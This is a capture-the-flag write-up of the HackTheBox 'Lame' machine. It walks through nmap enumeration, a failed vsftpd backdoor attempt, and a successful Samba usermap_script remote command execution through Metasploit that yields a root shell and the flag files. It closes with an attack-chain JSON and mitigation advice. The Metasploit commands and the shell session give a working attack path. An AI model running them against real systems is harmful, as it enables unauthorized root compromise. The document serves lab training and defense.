# HTB Lame - Service Pivot from FTP Lead to Samba RCE

Scope: authorized HTB lab only.
Focus: multi-service enumeration, failed FTP exploit branch, and successful Samba remote command execution.

---

## 1. Investigation Objective

1. Identify externally exposed services.
2. Test likely historical vulnerabilities by service version.
3. Pivot when initial exploit path fails.
4. Obtain command execution and validate full compromise impact.

---

## 2. Recon and Service Discovery

```bash
nmap -sC -sV -Pn <TARGET_IP>
```

Key findings:
- 21/tcp FTP (vsftpd 2.3.4)
- 22/tcp SSH
- 139/tcp NetBIOS
- 445/tcp SMB (Samba 3.0.20)

---

## 3. FTP Branch Assessment

Anonymous FTP check:

```bash
ftp <TARGET_IP>
# username: anonymous
# password: anonymous
```

Observed result:
- no useful files in anonymous context.

Vulnerability research on version string suggests CVE-2011-2523 path (`vsftpd 2.3.4 backdoor`), but exploit attempt did not yield reliable shell in this run.

Analyst decision:
- pivot to SMB attack surface with stronger exploit confidence.

---

## 4. SMB Enumeration and Exploit Selection

Enumerate shares and permissions:

```bash
smbmap -H <TARGET_IP>
smbclient -N //<TARGET_IP>/tmp
```

Although `tmp` share content was low-value, service version (Samba 3.0.20) maps to CVE-2007-2447 (`usermap_script` command injection).

Verify exploit availability:

```bash
searchsploit samba 3.0.20
```

---

## 5. Exploitation (Metasploit usermap_script)

```text
msfconsole
msf6 > search samba 3.0.20
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(...) > set RHOSTS <TARGET_IP>
msf6 exploit(...) > set LHOST <ATTACKER_TUN0_IP>
msf6 exploit(...) > run
```

Expected result:
- command shell/session established on target host.

---

## 6. Post-Exploitation Validation

```bash
whoami
uname -a
ls /home
cat /home/makis/user.txt
cat /root/root.txt
```

---

## 7. Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -sC -sV -Pn 10.10.10.3
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1
139/tcp open  netbios-ssn Samba smbd 3.0.20
445/tcp open  netbios-ssn Samba smbd 3.0.20

analyst@kali:~$ ftp 10.10.10.3
Name: anonymous
Password: anonymous
ftp> ls
226 Directory send OK.

analyst@kali:~$ smbmap -H 10.10.10.3
[+] IP: 10.10.10.3:445   Name: lame   Permissions: READ,WRITE on tmp

analyst@kali:~$ searchsploit samba 3.0.20
Samba 3.0.20 - Remote Command Execution ...

msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(...) > set RHOSTS 10.10.10.3
msf6 exploit(...) > set LHOST 10.10.14.6
msf6 exploit(...) > run
[+] Command shell session opened

shell$ whoami
root
```

---

## 8. Analyst Reasoning Chain (Dataset-Style)

```json
{
  "scenario": "lame_service_pivot_to_samba_usermap_rce",
  "input_signals": [
    "Legacy FTP and Samba versions exposed",
    "Anonymous FTP allowed but no actionable data",
    "Samba 3.0.20 matched known command-injection vulnerability",
    "Metasploit usermap_script delivered shell access"
  ],
  "attack_chain": [
    {
      "step": 1,
      "tactic": "reconnaissance",
      "technique": "Network Service Discovery",
      "confidence": 0.96,
      "evidence": "nmap mapped FTP, SSH, and SMB services"
    },
    {
      "step": 2,
      "tactic": "resource_development",
      "technique": "Exploit Path Triage",
      "confidence": 0.81,
      "evidence": "vsftpd backdoor path tested then deprioritized"
    },
    {
      "step": 3,
      "tactic": "execution",
      "technique": "Exploitation for Remote Command Execution",
      "confidence": 0.93,
      "evidence": "samba usermap_script module opened shell"
    },
    {
      "step": 4,
      "tactic": "collection",
      "technique": "Data from Local System",
      "confidence": 0.87,
      "evidence": "user/root artifacts accessible post-compromise"
    }
  ],
  "hypotheses": [
    "Other legacy hosts may expose similar Samba configurations",
    "SMB signing and hardening likely absent in adjacent systems",
    "Local credential material may support lateral movement"
  ],
  "uncertainties": [
    "Whether FTP backdoor path is actively exploitable in current image",
    "Extent of host-based security controls is unknown",
    "No confirmation of SIEM visibility for SMB exploit sequence"
  ],
  "tool_calls": [
    {"name": "legacy_service_risk_mapper", "priority": "high"},
    {"name": "smb_exploitability_validator", "priority": "high"},
    {"name": "post_exploitation_artifact_scanner", "priority": "medium"}
  ],
  "mitigation": {
    "immediate": [
      "Upgrade Samba and remove vulnerable usermap configuration",
      "Disable anonymous FTP where not required",
      "Restrict SMB exposure to trusted management segments"
    ],
    "hardening": [
      "Apply secure baseline to legacy Linux file-sharing services",
      "Enforce host firewalling and service minimization",
      "Introduce centralized patch and vulnerability management"
    ],
    "monitoring": [
      "Alert on anomalous MS-RPC/Samba function calls",
      "Detect suspicious Metasploit-like SMB exploitation traffic",
      "Track remote shell spawn indicators on file servers"
    ]
  }
}
```